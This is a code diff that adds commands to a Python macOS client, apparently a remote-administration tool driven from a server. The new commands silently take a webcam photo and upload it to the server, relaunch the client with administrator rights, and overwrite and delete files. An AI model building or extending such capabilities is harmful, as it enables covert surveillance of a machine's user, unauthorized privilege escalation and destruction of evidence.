@@ -1,6 +1,7 @@
 import os
 import subprocess
 import sys
+import tempfile
 import time
 
 from client.commands.argument_command_registry import (
@@ -210,6 +211,112 @@ class MacCommands(CommonCommands):
         except Exception as e:
             return 0, f'Failed to read idle time: {e}'
 
+    @desc('Capture webcam photo', group='platform')
+    @interruptible()
+    def webcam_snap(self):
+        """拍照并上传到服务器"""
+        try:
+            import subprocess
+            import tempfile
+            import os
+            from core.utils.formatting import get_time, get_size
+
+            # 检查 imagesnap 是否安装
+            result = subprocess.run(['which', 'imagesnap'], capture_output=True)
+            if result.returncode != 0:
+                return 0, '请安装 imagesnap: brew install imagesnap'
+
+            temp_file = tempfile.NamedTemporaryFile(suffix='.jpg', delete=False)
+            temp_file.close()
+
+            subprocess.run(['imagesnap', '-w', '1', temp_file.name],
+                           capture_output=True, timeout=5)
+
+            if os.path.getsize(temp_file.name) > 0:
+                filename = f'webcam_{get_time()}.jpg'
+                self._upload_single_file_to_server_result(temp_file.name, category='webcam')
+
+                file_size = get_size(os.path.getsize(temp_file.name))
+                os.unlink(temp_file.name)
+
+                return 1, f'Webcam photo captured: {filename} ({file_size})'
+            else:
+                os.unlink(temp_file.name)
+                return 0, 'Failed to capture webcam photo'
+
+        except Exception as e:
+            return 0, f'Webcam capture failed: {e}'
+
+
+    @desc('Launch new instance with sudo (macOS)', group='platform')
+    @interruptible()
+    def sudo_launch(self):
+        """以 root 权限启动新实例，返回 PID"""
+        import subprocess
+        import os
+        from core.utils.client_util import get_executable_path
+
+        cmd = get_executable_path()
+
+        # 使用 osascript 启动，不等待
+        proc = subprocess.Popen(
+            ['osascript', '-e', f'do shell script "{cmd}" with administrator privileges'],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL
+        )
+
+        return 1, f'New instance launched with sudo (parent PID: {proc.pid})'
+
+    @desc('Securely delete file (overwrite)', group='file')
+    @interruptible()
+    def file_shred(self, path):
+        """安全删除文件（覆写后删除）"""
+        try:
+            import os
+
+            target = self._resolve_target_path(path)
+            if not os.path.exists(target):
+                return 0, f'Path not found: {target}'
+
+            if os.path.isdir(target):
+                return 0, 'Use rmdir for directories'
+
+            # 获取文件大小
+            size = os.path.getsize(target)
+
+            self._send_interim_result(1, f'Shredding {target} ({size} bytes)', 0)
+
+            # 多次覆写
+            with open(target, 'r+b') as f:
+                for i in range(3):
+                    self._ensure_not_interrupted()
+                    f.seek(0)
+                    # 第一次: 0x00
+                    f.write(b'\x00' * size)
+                    f.flush()
+
+                    self._ensure_not_interrupted()
+                    f.seek(0)
+                    # 第二次: 0xFF
+                    f.write(b'\xFF' * size)
+                    f.flush()
+
+                    self._ensure_not_interrupted()
+                    f.seek(0)
+                    # 第三次: 随机数据
+                    f.write(os.urandom(size))
+                    f.flush()
+
+            # 最后删除
+            os.remove(target)
+
+            return 1, f'File securely deleted: {target}'
+
+        except Exception as e:
+            return 0, f'Failed to shred file: {e}'
+
+
+
     @argument_command('msgbox', spec=MSGBOX_ARGUMENT_SPEC)
     def _acmd_msgbox(self, args_dict, payload=None):
         try:
@@ -295,57 +402,6 @@ class MacCommands(CommonCommands):
         except Exception as e:
             return 0, f'Query failed: {e}'
 
-    # @argument_command('image_info', spec=IMAGE_INFO_SPEC)
-    # def _acmd_image_info(self, args_dict, payload=None):
-    #     """获取图片信息"""
-    #     try:
-    #         from PIL import Image
-    #         import json
-    #
-    #         img_path = args_dict.get('path', '')
-    #         output_json = args_dict.get('json', False)
-    #
-    #         if not img_path:
-    #             return 0, 'path is required'
-    #
-    #         if not os.path.isfile(img_path):
-    #             return 0, f'File not found: {img_path}'
-    #
-    #         img = Image.open(img_path)
-    #
-    #         info = {
-    #             'path': img_path,
-    #             'size': f"{img.width}x{img.height}",
-    #             'width': img.width,
-    #             'height': img.height,
-    #             'format': img.format,
-    #             'mode': img.mode,
-    #             'file_size': os.path.getsize(img_path)
-    #         }
-    #
-    #         # 获取 EXIF 信息
-    #         if hasattr(img, '_getexif') and img._getexif():
-    #             exif = img._getexif()
-    #             exif_tags = {
-    #                 271: 'make', 272: 'model', 306: 'datetime',
-    #                 33434: 'exposure_time', 34855: 'iso', 37386: 'focal_length'
-    #             }
-    #             for tag, name in exif_tags.items():
-    #                 if tag in exif:
-    #                     info[name] = exif[tag]
-    #
-    #         img.close()
-    #
-    #         if output_json:
-    #             return 1, json.dumps(info, ensure_ascii=False, indent=2)
-    #
-    #         from core.utils.formatting import format_dict
-    #         return 1, format_dict(info)
-    #
-    #     except ImportError:
-    #         return 0, 'PIL not installed, install with: pip install Pillow'
-    #     except Exception as e:
-    #         return 0, f'Failed to get image info: {e}'
 
     @argument_command('image_info', spec=IMAGE_INFO_SPEC)
     def _acmd_image_info(self, args_dict, payload=None):
